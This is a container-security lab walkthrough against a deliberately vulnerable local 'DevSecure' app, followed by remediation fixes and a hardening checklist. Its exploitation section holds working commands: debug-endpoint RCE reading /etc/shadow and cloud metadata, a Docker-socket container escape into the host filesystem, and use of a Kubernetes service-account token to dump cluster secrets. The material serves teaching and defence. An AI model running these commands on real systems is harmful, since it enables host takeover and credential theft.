# Lab 06 — Container Security Assessment Lab

## Overview
**Application:** DevSecure Platform (Containerized)
**Target:** http://localhost:8080
**Vulnerability Class:** Container Misconfigurations, Secrets Exposure, Privilege Escalation

---

## Architecture
```
Internet → Docker Host
             ├── devsecure-web  (port 8080)  ← Vulnerable web app
             ├── devsecure-api  (port 8081)  ← API service
             └── devsecure-db   (port 5432)  ← PostgreSQL (exposed!)
```

## Starting the Lab
```bash
cd lab-06-container-security/docker
docker compose up -d

# Verify containers are running
docker ps
```

---

## Step 1: Reconnaissance

### Discover Running Containers
```bash
# List all running containers and their config
docker ps

# Inspect the web container
docker inspect devsecure-web

# Check what user the process runs as
docker exec devsecure-web id
docker exec devsecure-web whoami

# Check image history for secrets in build args
docker history devsecure-web:latest

# Enumerate open ports
docker port devsecure-web
```

### API Reconnaissance
```bash
# Discover endpoints (look at the lab UI)
curl http://localhost:8080/
curl http://localhost:8080/health
curl http://localhost:8080/debug
```

---

## Step 2: Threat Modeling

| ID | Threat | Asset | Attack Vector | CVSS |
|----|--------|-------|--------------|------|
| CONT-001 | Container runs as root | Full host access | `docker exec` → root shell | 9.8 Critical |
| CONT-002 | Outdated base image | CVE exploitation | Pull CVE list via trivy | 8.0 High |
| CONT-003 | Docker socket mounted | Container escape | Socket → spawn containers | 9.9 Critical |
| CONT-004 | Secrets in ENV vars | Credentials | `docker inspect` → secrets | 8.1 High |
| CONT-005 | RCE via debug endpoint | Full server access | `/exec?cmd=id` | 9.8 Critical |
| K8S-001 | Wildcard RBAC | Cluster takeover | SA token → kubectl | 9.1 Critical |
| K8S-004 | Secrets in YAML | Credential theft | Git history, etcd | 7.5 High |
| CI-001 | Hardcoded CI secrets | Repo compromise | Read workflow file | 9.0 Critical |

---

## Step 3: Exploitation

### CONT-004: Extract Secrets from Environment Variables
```bash
# Method 1: Via Docker inspect (requires Docker socket access)
docker inspect devsecure-web | grep -A2 '"Env"'

# Method 2: Via the vulnerable API endpoint
curl http://localhost:8080/env

# Method 3: Via debug endpoint
curl http://localhost:8080/debug

# Method 4: Read from /proc if container has access
docker exec devsecure-web cat /proc/1/environ | tr '\0' '\n'
```

### CONT-001 + CONT-005: Root RCE
```bash
# Verify we're running as root
curl http://localhost:8080/exec?cmd=id
# Expected: uid=0(root) gid=0(root)

# Read sensitive files (only possible as root)
curl "http://localhost:8080/exec?cmd=cat+/etc/shadow"
curl "http://localhost:8080/exec?cmd=cat+/root/.bashrc"

# Check for cloud metadata
curl "http://localhost:8080/exec?cmd=curl+http://169.254.169.254/latest/meta-data/"
```

### CONT-003: Container Escape via Docker Socket
```bash
# Verify Docker socket is mounted
docker exec devsecure-web ls -la /var/run/docker.sock

# Use mounted socket to escape to host
docker exec devsecure-web sh -c \
  "docker -H unix:///var/run/docker.sock run -it --rm \
   -v /:/host-root alpine chroot /host-root"

# From inside the escaped container — you now have host access!
cat /host-root/etc/shadow
ls /host-root/home
```

### CONT-003: File System Escape via Volume Mount
```bash
# The /tmp mount maps to host's /tmp
curl "http://localhost:8080/files?path=/host-tmp"

# Write a file to host's /tmp
curl "http://localhost:8080/exec?cmd=echo+pwned+>+/host-tmp/pwned-by-lab06.txt"

# Verify on host
cat /tmp/pwned-by-lab06.txt
```

### K8S-001: Exploit Overly Permissive RBAC
```bash
# In a real K8s cluster — the default SA has wildcard permissions
# From inside the pod, use the mounted SA token to call K8s API:

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
K8S_API="https://kubernetes.default.svc"

# List all secrets in cluster (K8S-011 wildcard permissions)
curl -sk -H "Authorization: Bearer $TOKEN" \
  $K8S_API/api/v1/namespaces/default/secrets

# Read another pod's secrets
curl -sk -H "Authorization: Bearer $TOKEN" \
  $K8S_API/api/v1/namespaces/kube-system/secrets

# Analyze the RBAC configuration for findings:
cat kubernetes/vulnerable/rbac.yaml
# Note: ClusterRole with "*" on all resources
```

### K8S-004: Decode Kubernetes Secrets (Base64)
```bash
# K8s "secrets" are just base64 encoded — NOT encrypted by default!
cat kubernetes/vulnerable/rbac.yaml | grep -A10 "kind: Secret"

# Decode the "secrets"
echo "c3VwZXJfc2VjcmV0X2RiX3Bhc3NfMTIz" | base64 -d
# Output: super_secret_db_pass_123

echo "ZGV2LWp3dC1zZWNyZXQ=" | base64 -d
# Output: dev-jwt-secret
```

### CI-001: Secrets in CI/CD Pipeline
```bash
# View the hardcoded secrets in the workflow file
cat cicd/.github-workflow-vulnerable.yml | grep -E "(AWS|PASSWORD|SECRET|KEY)" | head -20

# The AWS key is visible directly in the file:
# AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
# Anyone with repo read access gets these credentials!
```

### Image Scanning (if Trivy installed)
```bash
# Scan for CVEs in the base image
trivy image python:3.9

# Scan for secrets in the image
trivy image --scanners secret devsecure-web:latest

# Scan Kubernetes manifests
trivy config kubernetes/vulnerable/
```

---

## Step 4: Impact Assessment

| Finding | Impact |
|---------|--------|
| Running as root + RCE | Full container compromise, host privilege escalation |
| Docker socket mounted | Complete host takeover — spawn privileged containers |
| Secrets in ENV | Credential theft: DB, AWS, JWT — lateral movement to cloud |
| K8S wildcard RBAC | Full cluster control — exfiltrate all secrets, deploy malware |
| K8S secrets base64 | All stored secrets decryptable by anyone with etcd access |
| CI secrets hardcoded | Anyone with repo access gets production credentials |
| Outdated base image | N-day CVE exploitation for initial access |

**Business Impact:**
- Complete cloud environment compromise via exposed AWS keys
- Data breach: all database contents accessible
- Supply chain attack via compromised CI/CD pipeline
- Compliance violations: GDPR, PCI-DSS, SOC2 failures

---

## Step 5: Remediation

### Fix CONT-001: Run as Non-Root
Compare the two Dockerfiles:
```bash
diff docker/vulnerable/Dockerfile.web docker/secure/Dockerfile.web
```

Key fix:
```dockerfile
# SECURE: Create and use non-root user
RUN useradd -r -u 1001 appuser
USER appuser
```

### Fix CONT-003: Remove Docker Socket Mount
```yaml
# REMOVE from docker-compose.yml:
volumes:
  - /var/run/docker.sock:/var/run/docker.sock  # DELETE THIS LINE

# And set privileged: false (or remove the key)
privileged: false
```

### Fix CONT-004: Use Secrets Manager (not ENV vars)
```yaml
# Use Docker secrets or K8s Secrets references:
environment:
  - DB_PASSWORD_FILE=/run/secrets/db_password  # Reference a file

secrets:
  db_password:
    external: true
```

### Fix K8S-001: Least Privilege RBAC
```yaml
# INSTEAD of wildcard ClusterRole, use specific permissions:
apiVersion: rbac.authorization.k8s.io/v1
kind: Role  # Use Role (namespace-scoped), not ClusterRole
metadata:
  namespace: devsecure-prod
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]   # Only what the app needs
```

### Fix CI-001: Use GitHub Secrets
```yaml
# INSTEAD of hardcoding:
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```

### Run the Security Scanner
```bash
./tools/container_scanner.sh devsecure-web
```

---

## Security Checklist

| Control | Vulnerable Config | Secure Config |
|---------|-----------------|---------------|
| User | root | UID 1001 non-root |
| Privileged | true | false |
| Capabilities | NET_ADMIN, SYS_PTRACE | DROP ALL |
| Docker socket | Mounted | Not mounted |
| Resource limits | None | CPU + memory limits |
| Read-only FS | false | true |
| Secrets storage | ENV vars | K8s Secrets / Vault |
| Base image | python:3.9 | python:3.11.7-slim |
| Image scanning | Never | Every build (Trivy) |
| RBAC | Wildcard * | Least privilege |
